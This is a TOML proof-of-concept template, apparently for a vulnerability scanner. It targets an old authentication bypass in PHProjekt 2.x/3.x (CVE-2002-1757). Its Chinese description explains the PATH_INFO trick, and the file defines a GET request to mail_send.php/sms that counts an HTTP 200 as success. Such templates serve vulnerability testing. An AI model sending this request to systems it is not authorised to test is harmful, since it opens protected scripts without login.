[info]
author = "ave"
description = "验证 PHProjekt 2.0-3.1 身份验证绕过漏洞。该漏洞利用 $PHP_SELF 变量包含 PATH_INFO 路径信息的特性，通过在 mail_send.php 后附加 /sms 路径绕过认证机制，无需登录即可访问受保护脚本。"
id = "POC-AVE-2002-0671"
name = "PHProjekt 2.x/3.x Authentication Bypass PoC"
severity = "high"
tags = ["ave-2002-0671"]
vuln_id = [
    "CVE-2002-1757",
    "AVE-2002-0671",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/mail_send.php/sms"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
